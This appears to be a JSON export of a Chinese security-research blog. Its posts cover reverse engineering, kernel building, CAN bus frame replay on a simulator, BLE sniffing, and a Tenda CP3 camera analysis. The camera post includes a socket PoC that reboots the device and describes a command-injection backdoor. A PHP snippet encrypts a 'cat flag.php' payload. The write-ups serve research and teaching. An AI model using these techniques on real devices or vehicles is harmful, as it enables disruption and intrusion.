接下来，我们可以通过重命名变量，或是添加注释的方式，进一步地增加反编译的可读性。比如，此处明显地，sVar1为一个指示长度的变量。我们选中它，并点击快捷键L，重命名sVar1为length。我们也可以点击;，在一处添加注释。 通过几步简单的操作，相信我们都已经十分清楚，这个main函数在做什么了。总的来说，参数需要为恰好一个，长度为10且第五个字符串为’@‘。 对于更为复杂的程序来说，我们需要对编译结果以及其可读性进行优化的过程也会不可避免地更为漫长。不过以每个函数的函数签名作为切入点，将仍是非常高效的方式。","categories":[],"tags":[],"keywords":[]},{"title":"预处理，编译，汇编，链接","slug":"随手记/c的编译","date":"2023-08-18T01:46:55.714Z","updated":"2023-08-18T01:57:46.744Z","comments":true,"path":"article/9d94ce31.html","link":"","permalink":"http://example.com/article/9d94ce31.html","excerpt":"","text":"预处理 gcc -E test.c -o test.i 以“#”号开头的预处理指令如包含#include,宏定义制定#define等。在源程序中这些指令都放在函数之外，而且一般放在源文件的前面。 使用预处理器把源文件test.c经过预处理生成test.i文件。 编译 gcc -S test.i -o test.s 这里的编译不是指程序从源文件到二进制程序的全部过程，而是指将经过预处理文件（test.i）之后的程序转换成特定汇编（test.s）代码的过程。 汇编 gcc -c test.s -o test.o 汇编过程将上一步的汇编代码转换成机器码，这一步产生的文件叫做目标文件，是二进制格式。 链接 gcc test.o -o test 链接过程使用链接器将该目标文件与其他目标文件、库文件、启动文件等链接起来生成可执行文件。附加的目标文件包括静态连接库和动态连接库。","categories":[{"name":"随手记","slug":"随手记","permalink":"http://example.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"}],"tags":[],"keywords":[{"name":"随手记","slug":"随手记","permalink":"http://example.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"}]},{"title":"无线电学习随记","slug":"随手记/无线电学习随记","date":"2023-07-21T05:45:12.945Z","updated":"2023-07-22T01:00:09.609Z","comments":true,"path":"article/3ffd580a.html","link":"","permalink":"http://example.com/article/3ffd580a.html","excerpt":"","text":"","categories":[{"name":"随手记","slug":"随手记","permalink":"http://example.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"}],"tags":[],"keywords":[{"name":"随手记","slug":"随手记","permalink":"http://example.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"}]},{"title":"智能汽车安全攻防大揭秘读书笔记","slug":"车联网/智能汽车安全攻防大揭秘读书笔记","date":"2023-06-27T16:00:00.000Z","updated":"2023-06-28T06:54:42.610Z","comments":true,"path":"article/a091bca6.html","link":"","permalink":"http://example.com/article/a091bca6.html","excerpt":"","text":"实用obd接口可直接访问车内can总线，汽车OBDII接口的物理尺寸和针脚定义是国际标准，由SAE制定，欧盟也沿用了这个标准，最后全世界普及的也都是这个标准。（虽然OBD接口是通用的，但是can协议基本各家有各家的东西） 可以购买obd盒子(一种插 在OBD接又上的硬件设备，作用是将数据无线传输到手机或者服务器，然后对数据 进行可视化或分析)来尝试访问汽车数据和控制汽车。 obd盒子可作为研究方向的一种。","categories":[{"name":"车联网","slug":"车联网","permalink":"http://example.com/categories/%E8%BD%A6%E8%81%94%E7%BD%91/"}],"tags":[],"keywords":[{"name":"车联网","slug":"车联网","permalink":"http://example.com/categories/%E8%BD%A6%E8%81%94%E7%BD%91/"}]},{"title":"can总线","slug":"车联网/canBus","date":"2023-06-12T16:00:00.000Z","updated":"2023-06-27T01:01:34.675Z","comments":true,"path":"article/16fe91ce.html","link":"","permalink":"http://example.com/article/16fe91ce.html","excerpt":"","text":"雨夜，高架，疾驰的迈巴赫… 跑题了跑题了。 无论是驾驶还是乘坐车辆，你是否曾产生过一个疑问：车辆上的那么多功能和部件，它们是如何知道你在进行什么操作的？另外，仪表盘又是如何显示发动机转速的？ 随着现代汽车功能的不断丰富，相应的硬件和传感器也越来越多。 通常，工程师们会将不同的硬件和功能归类到不同的系统中，并使用电子控制单元（ECU）来处理这些系统中的各种功能。然而，现代汽车更常见的做法是将相关功能集成到一个或多个ECU中，以提高整体效率和性能。 那么，这些ECU是如何相互通信的呢？ 现代汽车中的各个电子控制单元（ECU）通过车载通信网络相互通信。这些通信网络通常采用标准的汽车通信协议，例如控制器局域网（CAN）或局域网通信（LIN）。每个ECU负责管理和控制特定的系统或子系统，例如发动机管理系统、制动系统、空调系统等。 当进行操作时，例如按下按钮、踩下油门踏板或转动方向盘，相应的传感器会感知到这些操作并将信息发送给负责该系统的ECU。ECU接收到这些输入信号后，会进行相应的处理并采取相应的控制措施，例如调整发动机转速、启动制动系统等。 仪表盘上的显示信息是由主要的仪表盘控制器负责。该控制器接收来自各个系统的信息，并根据需要显示在仪表盘上的显示屏上，包括发动机转速、车速、油量、水温等。 这张图里涉及到两个不同的控制单元之间需要相互传递的数据。在传递每项信息时，通常需要使用一条数据线来进行传输。因此，如果存在5个不同的信息需要相互传递，那么就需要使用5条数据线。 然而，随着需要传递的信号项增多，控制单元之间的连接就会变得更加复杂。引脚数量的增加会导致线路布局的复杂化，进而可能增加故障发生的概率，并给维修工作带来一定的困难。 为了应对这个问题，产生了CAN总线（Controller Area Network）。CAN总线采用了一种更为高效和可靠的数据传输方式。它只需要使用两条数据线来传递所有控制单元之间的信息交换。通过使用CAN总线，各个控制单元可以直接将信息发送到总线上，而其他控制单元则可以从总线上接收到这些信息。这种基于总线的通信架构不仅简化了线路连接，还提高了系统的可靠性和可扩展性。 因此，CAN总线成为了许多领域中广泛应用的一种通信协议，特别适用于汽车、工业控制和机器人等领域。它在降低线路复杂性、提高系统稳定性和可靠性方面发挥着重要作用，为各个控制单元之间的数据传输提供了高效的解决方案。 如下图 在车内大概就是这样。 通过采用CAN总线，能够有效地减少电控单元之间所需的针脚数量以及各种复杂的线束连接。 在不同的系统中，使用的总线速率有所不同。 高速CAN系统通常被称为动力型，主要用于控制电控单元、ABS系统等高速数据传输的场景。 而低速CAN系统则被称为舒适型，主要用于控制仪表、防盗系统等对速度要求较低的场景。 通过将系统划分为不同的CAN总线，可以根据不同的应用需求选择适当的速率，从而实现高效的数据传输和控制。这种分级的设计方案既满足了不同系统模块之间的通信需求，又能够有效地管理和分配系统资源，提高整体系统的性能和可靠性。 ![image-20230614093539108](&#x2F;Users&#x2F;pipi&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230614093539108.png) CAN总线通常使用双绞线，即两根扭在一起的导线，以提供良好的信号传输和抗干扰能力。 这两根线分别称为CAN-High（CAN-H）和CAN-Low（CAN-L），它们承载着CAN总线上的数据传输。 不同类型的CAN总线在线的颜色上有所区别，这些颜色可作为参考标准： 驱动CAN（动力型CAN）的线路颜色通常为橙色（CAN-H）和黑色（CAN-L）。 舒适CAN（低速型CAN）的线路颜色通常为橙绿色（CAN-H）和橙棕色（CAN-L）。 信息娱乐CAN的线路颜色通常为橙紫色（CAN-H）和橙棕色（CAN-L）。 CAN总线的二进制信号由CAN-H与CAN-L的电压差大小来表示 即： 信号&#x3D;CAN_H - CAN_L 具体的高低电平这里不赘述，可以自行查阅。 can通信帧分为数据帧、远程帧、错误帧、过载帧和帧间隔五种类型。 数据帧结构上由7个段组成，其中根据仲裁段ID码长度的不同，分为标准帧（CAN2.0A）和扩展帧（CAN2.0B）。 远程帧与数据帧差不多，但没有数据段。 错误帧，当canbus发生以下五种错误时，节点将主动发送错误帧 CRC错误，格式错误，应答错误，位发送错误，位填充错误。 当某个节点没有准备好接收下一帧准备的时候，会发送过载帧 帧间隔用于将数据帧或远程帧和他们之前的帧分离开，但过载帧和错误帧前面不会插入帧间隔。 can数据帧组成为：帧起始-仲裁段-控制段-数据段-CRC段- ACK段-帧结束 帧起始：由单个显性位组成。总线空闲时，发送节点发送帧起始， 其他接收节点同步于该帧起始位。 仲裁段：CAN-bus并没有规定节点优先级，但是多个节点只有一条总线，总归要有先后，仲裁段就解决了这些问题。 控制段：表述数据段的字节数 数据段：发送数据组成，可包含0-8个字节的数据。 CRC段：CAN-bus使用CRC校验进行数据检错，CRC校验值存放于CRC段。 ACK段：当一个接收节点接收的帧起始到CRC段之间的内容没发生错误时，它将在ACK段发送一个显性电平。 帧结束：结束。 可以在linux中可以使用ICSim来模拟 项目地址：https://github.com/zombieCraig/ICSim # 安装依赖 sudo apt install libsdl2-dev libsdl2-image-dev can-utils maven autoconf -y # 下载ICSim git clone https://github.com/zombieCraig/ICSim.git # 编译安装 cd ICSim/ sudo make socketcand # 下载socketcand git clone https://github.com/linux-can/socketcand.git cd socketcand# 获取缺少的文件 wget https://raw.githubusercontent.com/dschanoeh/socketcand/master/config.h.in# 编译安装 autoconf ./configure make clean make sudo make install 启动模拟器 # 设置vcan（虚拟CAN）接口 sudo modprobe can sudo modprobe vcan # ip link 命令启动 can 接口 sudo ip link add dev vcan0 type vcan sudo ip link set up vcan0 cd Icsim/ # 打开仪表盘模拟器 ./icsim vcan0 # 打开仪表盘控制器 ./controls vcan0 ![image-20230615105849708](&#x2F;Users&#x2F;pipi&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230615105849708.png) 功能 控制按钮 转向 键盘左右 速度 键盘上下 开&#x2F;关左前车门 右shift&#x2F;左shit+A 开&#x2F;关右前车门 右shift&#x2F;左shit+B 开&#x2F;关左后车门 右shift&#x2F;左shit+X 开&#x2F;关右后车门 右shift&#x2F;左shit+Y 开启全部车门 左shift+右shift 关闭全部车门 右shift+左shift candump监听模拟器操作的数据包，再利用canplayer集合数据包重新回放一遍监听到的操作. candump vcan0 -l 操作结束后在路径下会发现.log文件 使用canplayer重放数据包 canplayer -I can-xxxxx.log 由于can是在不停通信的，所有log内容会非常多。 一般用二分法来查找具体某条指令。 split -n 2 file 然后将两个文件分别重放，找到哪个里有需要的指令，然后继续分，继续重放，直到找到。 最后发现(1686800272.972740) vcan0 188#02000000为右转弯指令 在#之后看到02，猜测01为左转，修改尝试执行成功。 作为汽车内非常重要的一个东西，在车联网安全也是个重要的知识点。","categories":[{"name":"车联网","slug":"车联网","permalink":"http://example.com/categories/%E8%BD%A6%E8%81%94%E7%BD%91/"}],"tags":[],"keywords":[{"name":"车联网","slug":"车联网","permalink":"http://example.com/categories/%E8%BD%A6%E8%81%94%E7%BD%91/"}]},{"title":"golang 压缩体积","slug":"随手记/golang压缩体积","date":"2023-06-10T03:05:54.758Z","updated":"2023-08-23T06:35:11.838Z","comments":true,"path":"article/49750c0a.html","link":"","permalink":"http://example.com/article/49750c0a.html","excerpt":"","text":"go build -ldflags=&quot;-s -w&quot; -o server main.go &amp;&amp; upx -9 server 去除调试信息，upx最大压缩 相差4.4M","categories":[{"name":"随手记","slug":"随手记","permalink":"http://example.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"}],"tags":[],"keywords":[{"name":"随手记","slug":"随手记","permalink":"http://example.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"}]},{"title":"php aes加密 向量重合","slug":"随手记/php aes加密 向量重合","date":"2023-06-08T02:08:48.127Z","updated":"2023-06-08T02:18:31.724Z","comments":true,"path":"article/335bf9d2.html","link":"","permalink":"http://example.com/article/335bf9d2.html","excerpt":"","text":"&lt;?php $key = &#x27;aaaa&#x27;; $ciphertext = base64_decode(&#x27;Ki3cH0Pl9gX3Qu4gk/La2l2WUK5WM6lO3yoarPOfKv6tLAAFt7LYtu1TsJBr/FLV&#x27;); $iv_size = openssl_cipher_iv_length(&#x27;AES-256-CBC&#x27;); $iv = substr($ciphertext, 0, $iv_size); $encrypted = substr($ciphertext, $iv_size); $text = openssl_decrypt($encrypted, &#x27;AES-256-CBC&#x27;, $key, OPENSSL_RAW_DATA, $iv); echo $text; ?&gt; &lt;?php $key = &#x27;aaaa&#x27;; $text = &quot;system(&#x27;cat flag.php&#x27;)&quot;; $iv_size = openssl_cipher_iv_length(&#x27;AES-256-CBC&#x27;); $iv = openssl_random_pseudo_bytes($iv_size); $ciphertext = openssl_encrypt($text, &#x27;AES-256-CBC&#x27;, $key, OPENSSL_RAW_DATA, $iv); echo base64_encode($iv . $ciphertext); ?&gt;","categories":[{"name":"随手记","slug":"随手记","permalink":"http://example.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"}],"tags":[],"keywords":[{"name":"随手记","slug":"随手记","permalink":"http://example.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"}]},{"title":"linux系统编译-x86_64","slug":"技/编译linux系统","date":"2023-02-11T16:00:00.000Z","updated":"2023-06-01T01:56:00.771Z","comments":true,"path":"article/e55c327a.html","link":"","permalink":"http://example.com/article/e55c327a.html","excerpt":"","text":"编译Linux内核 编译busybox 制作文件系统 制作根文件系统镜像文件 利用qemu运行linux内核 #下载需要的工具 sudo apt-get install libncurses5-dev flex libelf-dev libssl-dev qemu lzop 编译内核Index of &#x2F;sites&#x2F;ftp.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel&#x2F; (sjtu.edu.cn) 这里选择版本，从1.0 到 6.0都可以下载，看具体要求 这里是国内镜像站，源站为The Linux Kernel Archives #下载内核 wget http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/v6.x/linux-6.1.tar.gz #解压内核 tar -vxf linux-6.1.tar.gz cd linux-6.1 #指定架构 export ARCH=x86 #配置board config make x86_64_defconfig #配置内核 make menuconfig #编译 make -j8 如果要编译其他架构的需要配置工具链 export CROSS_COMPILE= 配置 General setup ---&gt; ----&gt; [*] Initial RAM filesystem and RAM disk (initramfs/initrd) support Device Drivers ---&gt; [*] Block devices ---&gt; &lt;*&gt; RAM block device support (65536) Default RAM disk size (kbytes) 图形化配置内核，记得保存再退出 make -j8 参数是多核编译，告诉编译器同时处理8个编译任务，能大大加快编译速度。 编译好长这样。 编译busybox#下载 wget https://busybox.net/downloads/busybox-1.36.0.tar.bz2 #解压 tar -xvf busybox-1.36.0.tar.bz2 cd busybox-1.36.0 #配置 这里要配置静态文件 settings -&gt; Build static binary (no shared libs) make menconfig #编译 make &amp;&amp; make install 配置 Busybox Settings ---&gt; Build Options ---&gt; [*] Build BusyBox as a static binary (no shared libs) 编译好的busybox在_install 目录下 制作文件系统直接在_install文件夹下补充必要文件夹 cd _install # -p参数是确保存在 mkdir -p etc dev mnt proc sys tmp proc sys mkdir -p etc/init.d/ #当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录。 #详情请看 vim etc/fstab proc /proc proc defaults 0 0 tmpfs /tmp tmpfs defaults 0 0 sysfs /sys sysfs defaults 0 0 # rcS是一个脚本文件，在inittab文件中本解析调用，用于配置Linux系统。 vim etc/init.d/rcS echo -e &quot;Welcome to linux&quot; /bin/mount -a echo -e &quot;Remounting the root filesystem&quot; mount -o remount,rw / mkdir -p /dev/pts mount -t devpts devpts /dev/pts echo /sbin/mdev &gt; /proc/sys/kernel/hotplug mdev -s chmod 755 etc/init.d/rcS # inittab是Linux系统中的一个配置文件，它定义了系统启动时要执行的进程和服务 vim etc/inittab ::sysinit:/etc/init.d/rcS ::respawn:-/bin/sh ::askfirst:-/bin/sh ::ctrlaltdel:/bin/umount -a -r chmod 755 etc/inittab cd dev #mknod 命令建立一个目录项和一个特殊文件的对应索引节点。 sudo mknod console c 5 1 sudo mknod null c 1 3 sudo mknod tty1 c 4 1 制作根文件系统镜像文件#从上一步返回到busybox源码文件夹，_install的上层目录 #创建一个32M的文件，内容全部填充为0。 dd if=/dev/zero of=./rootfs.ext3 bs=1M count=32 #格式化rootfs.ext3 mkfs.ext3 rootfs.ext3 #创建fs文件夹，将rootfs挂载到fs mkdir fs sudo mount -o loop rootfs.ext3 ./fs #将_install放入fs sudo cp -rf ./_install/* ./fs #卸载镜像文件 sudo umount ./fs #打包镜像 gzip --best -c rootfs.ext3 &gt; rootfs.img.gz 这里提供了脚本，可以直接使用 #!/bin/bash rm -rf rootfs.ext3 rm -rf fs dd if=/dev/zero of=./rootfs.ext3 bs=1M count=32 mkfs.ext3 rootfs.ext3 mkdir fs mount -o loop rootfs.ext3 ./fs cp -rf ./_install/* ./fs umount ./fs gzip --best -c rootfs.ext3 &gt; rootfs.img.gz 使用qemu运行内核qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage -initrd ./busybox-1.30.0/rootfs.img.gz -append &quot;root=/dev/ram init=/linuxrc console=ttyS0&quot; -serial file:output.txt -nographic","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"tendacp3","slug":"iot/tendaCP3","date":"2023-01-30T03:08:44.000Z","updated":"2023-06-01T01:10:32.297Z","comments":true,"path":"article/e3065a82.html","link":"","permalink":"http://example.com/article/e3065a82.html","excerpt":"","text":"这里就先不放设备照片了，诸位可以自己在该页面寻找下设备型号。 这款路由器是通过云端进行数据传输的，即 摄像头 &#x3D; 云端 &#x3D; 手机，无web页面，且并未发现摄像头与手机直接通信。 摄像头 前边这个黄色印字的pcb我并没有查出来具体是做什么的，但是我看这个设备介绍是有高清夜视能力的，我猜是这么个功能，不重要。 使用了上海富瀚的FH8626V100，下面是各种文档，详细文档我没找到。 https://www.fullhan.com/index.php?c=article&amp;id=221 https://www.fullhan.com/uploads/2021/11/163669725327888.pdf https://blog.csdn.net/xue_nuo/article/details/125717256?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-125717256-blog-122374192.pc_relevant_multi_platform_whitelistv2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3 https://blog.csdn.net/xue_nuo/article/details/122374192 flash 为H25S64，从查出来的资料来看是8m的，很遗憾的是我的ch341a并不支持这个型号的闪存，所以提取写入固件操作也办不到。 只能吧信息放到这了，原谅我硬件知识的匮乏。 固件这里因为flash型号的问题我没办法从固件提取，但是官网可以直接获取，且并没有加密。 squashfs 文件系统，但解包出来的文件系统在cpio文件中。 但涉及到一部分的文件还是在squashfs-root中 只有一个root账户默认开启。密码并没有爆破出来。 通过rcS文件的分析和对uart的输出信息来看，主要为两个服务 noodles 和apollo。后边会有分析。 文件格式为32位arm小端序 uart该设备有uart接口，并且将每个用处都标注出来了。但是是被堵上的，需要将杜邦线焊接上去。 （请忽略我的焊接技术，我真没学过） 波特率为115200，tenda好多设备都都是这个。 下面是通过打印获取到的一些信息。 这里理论上摁E可以不使用自动启动，但我没有成功。 linux内核 可以看到cpu相关的sdk。 两个服务的启动。noodles 和 apollo，前面提到过 noodles监听了1300端口，但我并没有找到任何关于这个服务的相关信息。 apollo应该是apache apollo服务 Apache Apollo是一个代理服务器，其是在ActiveMQ基础上发展而来的，可以支持STOMP, AMQP, MQTT, Openwire, SSL, and WebSockets 等多种协议。 https://www.freesion.com/article/41891296353/ 之后尝试逆向分析。 上次的坑来填了 之前没有系统学习过网络编程，花了一周时间把tinyhttpd的源代码阅读理解了一下，并且仿照用python写了一个简易的httpd，可以看我另一篇文章 noodles服务分析通过分析发现noodles监听了1300端口 启动 sudo chroot . .&#x2F;qemu-arm-static .&#x2F;usr&#x2F;bin&#x2F;noodles 可以使用nmap来查看是否监听1300 可以看到1300端口已开放，并且noodles也对nmap有反应了 静态分析对于程序的静态分析，可以从main函数来正向递进分析，也可以从一些字符串来分析，又或者从一些关键函数 这里通过nmap扫描时noodles的打印来查找 通过交叉引用发现在FUN_00011878函数中存在相关信息。 创建并监听1300端口 等待用户连接 获取client传进来的内容 主要内容处理在下面相似的内容处 1300端口大概做了这些事情 参数有一下几种 UPGRADE BURNMAC ELFEXEC SYSTEM SYSTEMEX DOWNLOAD UPLOAD FLASHDUMP BURNSN READSN WRITEENV READENV fun_00014f90()函数 三个参数分别为从client传入的内容，字符串，0 这里是xml参数处理。 成果这里出了一个代码注入和一个设备重启 设备重启设备重启是利用了代码问题，更像是设计时不严谨导致的 当标签中含有upgrade时，会运行到FUN_000146f4函数，执行完毕后必然会执行到FUN_00016b90函数来使设备重启。 只需要运行到此处，脚本会使设备重启 poc import socket import time s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&#x27;127.0.0.1&#x27;,1300)) s.send(&quot;&lt;UPGRADE&gt;test&lt;/UPGRADE&gt;&quot;.encode()) print(s.recv(1024)) s.close() 代码注入这里更像一个后门，直接在 FUN_000140b4函数中发现，如果&lt;system&gt;&lt;/system&gt;中的参数不是iwlist便会直接使用system执行","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"协议-低功耗蓝牙协议(BLE)","slug":"iot/协议-ble","date":"2023-01-11T08:42:31.000Z","updated":"2023-01-11T08:42:31.000Z","comments":true,"path":"article/94a01627.html","link":"","permalink":"http://example.com/article/94a01627.html","excerpt":"","text":"蓝牙蓝牙是一种近距离无线通信技术，运行在2.4GHz免费频段，目前已大量应用于各种移动终端，物联网，健康医疗，智能家居等行业。 低功耗蓝牙协议是由蓝牙技术联盟（Bluetooth SIG）在2010年发布的蓝牙4.0，并不是蓝牙3.0的升级，而是全新的技术架构。 蓝牙4.0版本分为两种模式，单模蓝牙和双模蓝牙。 双模蓝牙，支持低功耗蓝牙的同时还兼容经典蓝牙，经典蓝牙的特点是大数据高速率，例如音频、视频等数据传输，常见的蓝牙音箱就是双模蓝牙，他需要大量的音频数据传输。 单模蓝牙，即低功耗蓝牙模式，是蓝牙4.0中的重点技术，低功耗，快连接，长距离。像各种手环，蓝牙温度计等都属于单模蓝牙。 低功耗蓝牙目前低功耗蓝牙在移动终端，智能家居，互联设备等市场都有广泛应用。 其优点： 低功耗，使用纽扣电池就可以运行数月至数年。 快连接，毫秒级的连接速度，传统蓝牙甚至长达数分钟。 远距离，长达数百米的通信距离，而传统蓝牙通常10米左右。 蓝牙联盟为低功耗蓝牙定义了一些标准数据规范（profile），只要遵守该规范，任意厂家的蓝牙设备，均可以相互连接与通信，例如无线蓝牙键盘鼠标，无论是安卓或是iOS还是Windows，均是即插即用，这便是“标准”的力量。 低功耗蓝牙支持的标准Profile有： HID，用于无线鼠标，键盘或其他遥控设备。 BatteryServices，电池状态服务，用于告知电池电量状态。 HRP，心率计Profile，用于心率采集。等等。 低功耗蓝牙还可以自定义Profile，伴随着智能手机的发展和普及，低功耗蓝牙的这个特性得到了发扬光大，同时也拓宽了低功耗蓝牙的应用领域。例如，可以自定义一个开关量的Profile，数据01表示开灯，数据00表示关灯，然后手机发送数据01和00就可以控制灯的亮和灭。 类似的应用案例有很多，下面总结应用特点： 支持自定义Profile，可以收发任意格式的数据，如01和00。 支持自定义设备，支持任意设备的连接和通信，例如智能蓝牙插座等。 工作流程以下将低功耗蓝牙统称为BLE，低功耗蓝牙设备称为BLE设备。 角色BLE设备角色主要分为两种角色，主机（Master）和从机（Peripheral），当主机和从机建立连接之后才能相互收发数据。 主机，主机可以发起对从机的扫描连接。例如手机，通常作为BLE的主机设备。 从机，从机只能广播并等待主机的连接。例如智能手环，是作为BLE的从机设备。 另外还有观察者（Observer）和广播者（Broadcaster），这两种角色不常使用，但也十分有用，例如苹果的iBeacon，就是使用广播者角色来做，只需要广播特定内容即可。 iBeacon，苹果公司开发的一种通过低功耗蓝牙技术进行一个十分精确的微定位技术; 观察者，观察者角色监听空中的广播事件，和主机唯一的区别是不能发起连接，只能持续扫描从机。 广播者，广播者可以持续广播信息，和从机的唯一区别是不能被主机连接，只能广播数据 蓝牙协议栈没有限制设备的角色范围，同一个BLE设备，可以作为主机，也可以作为从机，我们称之为主从一体，主从一体的好处是，每个BLE设备都是对等的，可以发起连接，也可以被别人连接，更加实用。 广播一个智能手环，在绑定之前，需要让手机发现自己才能去进行绑定操作。 这个让手机发现自己的操作就叫做广播。 即从机每经过一个时间间隔发送一次广播数据包，这个时间间隔称为广播间隔，这个广播动作叫做广播事件，只有当从机处于广播状态时，主机才能发现该从机。 BLE设备拥有40个信道，从0到39，其中37，38，39就是BLE的广播信道。 在每个广播事件中，广播包会分别在37,38和39三个信道上依次广播。 广播时间间隔的范围是从20ms到10.24s，广播间隔影响建立连接的时间。广播间隔越大，连接的时间越长。 广播数据包最多能携带31个字节的数据，一般包含可读的设备名称，设备是否可连接等信息。 当主机收到从机广播的数据包后，它可以再发送获取更多数据包的请求，这个时候从机将广播扫描回应数据包，扫描回应数据包和广播包一样，可以携带31个字节的数据，如果长度不足，会补0，这部分数据无意义。 提示：蓝牙4.x，广播有效载荷最多是31个字节。而在蓝牙5.0中，通过添加额外的广播信道和新的广播PDU，将有效载荷增加到了255个字节 在安卓手机中可以使用BLE调试助手来查看广播包。 广播包一般格式为 0x长度类型数据长度类型数据… 0x02011A05030F1892FD11094544494649455220545753312050726F 这是我附近某个耳机的广播信息。 分析： 0x02&#x2F;01&#x2F;1A05，长度2&#x2F;类型&#x2F;对应长度的值。 0x03&#x2F;0F&#x2F;1892FD，长度3&#x2F;类型&#x2F;对应长度的值。 0x11&#x2F;09&#x2F;4544494649455220545753312050726F，长度16&#x2F;类型&#x2F;对应的值。 前两段数据并不能看出什么信息，第三段数据可以转为ascii看一下。 即蓝牙耳机名字。 扫描扫描是主机监听从机广播数据包和发送扫描请求的过程，主机通过扫描，可以获取到从机的广播包以及扫描回应数据包，主机可以对已扫描到的从机设备发起连接请求，从而连接从机设备并通信。 扫描动作有两个比较重要的时间参数：扫描窗口和扫描间隔，如果扫描窗口等于扫描间隔，那么主机将一直处于扫描状态之中，持续监听从机广播包。 被动扫描，主机监听广播信道的数据，当接收到广播包时，协议栈将向上层（也就是应用层，用户可编程）传递广播包。 主动扫描，主动扫描除了完成被动扫描的动作外，还会向从机发送一个扫描请求，从机收到该请求时，会再次发送一个称作扫描回应的广播包。 连接除了扫描， 设备也可以主动发起连接， 发起状态的设备和扫描状态的设备区别在于：当它监听到一个可连接的广播， 发起设备就会发送一个连接请求， 而扫描设备会发送一个扫描请求。连接请求包括一套为从设备准备的连接参数， 安排连接期间发生的通道和时间。如果广播设备接收了连接， 两个设备会进入连接状态， 发起方会称为 Master（主机），而广播方会称为 Slave（从机）。 所有的通信都发生在两个设备的连接事件期间， 连接事件周期的发生， 按照连接参数指定的间隔联系， 每个事件发生在某个数据通道（0~36）， 调频增量参数决定了下次连接时间发生的通道， 在每个连接时间期间， Master 先发送， Slave 会在 150us 之后做出回应， 即使一个连接事件发生（ 或两者）， 双方都没有数据发送（例外情况是从设备潜伏使能）， 这允许两个设备都承认对方仍然存在并保持活跃的连接。 主机和从机都可以主动断开连接。一边发起断开， 另一边必须在断开连接之前回应这个断开请求。 通信BLE 通信的两个基本概念。 GAP 通用访问配置文件(Generic Access Profile) GATT 通用属性配置文件(Generic Attribute Protocol) GAP完成了上面广播，连接的操作。 GATT则定义了两个 BLE 设备连接后如何使用服务和属性两个概念进行数据交换。 GATT 的两个主要概念： 服务（Services） 特征（Characteristics） Profile包含一个或者多个服务，每个服务又包含一个或者多个特征。主机可以发现和获取从机的服务和特征，然后与之通信。特征是主从通信的最小单元。 每个服务和特征都有自己的唯一标识UUID，标准UUID为128位，蓝牙协议栈中一般采用16位，也就是两个字节的UUID格式。 每个特征都有自己的属性，属性的取值有：可读 Read，可写 Write 以及 通知 Notify。 这样，两个BLE设备就有以下的数据交互方式。 主机可主动向从机Write写入或Read读取数据。 从机可主动向主机Notify通知数据。 测试这里使用了两台手机来模拟两个BLE设备 从机： 主机连接从机： 上面链接后可以看到整个profile，下面每个UUID对应一个服务，不同服务之间有不同的特征。在UUID为 0xFFF0的服务中，有三个特征，0xFFF1，0xFFF2，0xFFF3。 可以看到FFF1的属性为read&#x2F;notify，可读，通知。FFF2的属性为Write，可写。 从机页面中，从机通过0xfff1发送数据。0xfff2接收数据。 0xfff1从机发送数据： 主机实时接收: 0xfff2主机发送数据： 从机实时接收： 嗅探可以理解为利用窃听装置来获取双方通信内容。 ble设备功能设计中，一定会少不了私有的Service或Characteristic，就要通过app逆向或嗅探蓝牙通信来分析了。 蓝牙嗅探最好的神器是Ubertooth One，精致的硬件＋配套的软件变成了物联网黑客强大的帮手。 这玩意挺贵的，贵不是他的缺点，是我的缺点。 所以我们使用暂时使用廉价的替代方案，BLE USB Dongle。之后有设备后会配套更新相应文章。 这玩意只支持ble 这里使用的是一块nRF52832 Dongle，某宝可以直接买到烧录好的板子，具体烧录过程就不赘述。 具体可看官方文档：https://www.nordicsemi.com/Products 配置wireshark购买板子后找客服要来物料包，其中包含相关插件。 打开 wireshark → 帮助 → 关于 wireshark → 文件夹 → 双击打开 Extcap 路径(全 局路径和个人路径二选其一)如下图所示: 将 extcap 文件夹的四个文件复制到 wireshark 的 extcap 路径下， 以全局路径为例，如图所示: 双击 wireshark 个人配置的路径，如图: 在弹出的文件夹中打开 profiles 文件夹 将解压压缩包的 Profile_nRF_Sniffer_xx_xx 文件夹拷贝到 profiles 文件夹中，如图: 使用软件配置成功后，将设备 插入 USB 口连接至 PC 端，打开 Wireshark，选 择 nRF sniffer COMx，具体串口号根据实际选择。 在工具栏中选择 → 视图 → 接口工具栏 → nRF sniffer，会出现如下界面(默认抓取 所有 BLE 广播信号): 选择任一 BLE 从机上电进行广播。 抓取指定 MAC 地址设备的数据包。 可通过 APP 查看设备 MAC 地址，如下图所示: 如下图红色方框中所示，点击 devices 过滤下拉框选择对应 MAC 地址的 device，选择 固定设备后则只会抓取和该设备有关的数据包。 Wireshark 选择该 MAC 地址设备后，该设备的广播包、scan request packet 和 scan response packet 都会被捕获到。 